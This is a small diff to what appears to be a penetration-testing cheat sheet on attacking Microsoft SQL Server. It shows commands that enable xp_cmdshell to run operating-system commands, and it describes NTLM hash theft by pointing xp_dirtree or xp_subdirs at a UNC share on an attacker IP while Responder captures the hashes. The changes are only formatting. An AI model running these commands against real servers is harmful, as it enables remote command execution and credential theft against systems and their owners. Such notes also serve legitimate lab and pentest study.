@@ -62,11 +62,12 @@ EXECUTE sp_configure 'xp_cmdshell', 1
 RECONFIGURE
 xp_cmdshell 'whoami'
 ```
-Hash Stealing with xp_subdris or xp_dirtree
+Hash Stealing with xp_subdris or xp_dirtree  
 Start Responder on Attack machine
 ```powershell
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
 or
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
+#Collect hashes from Responder
 ```
-Collect hashes from responder
+
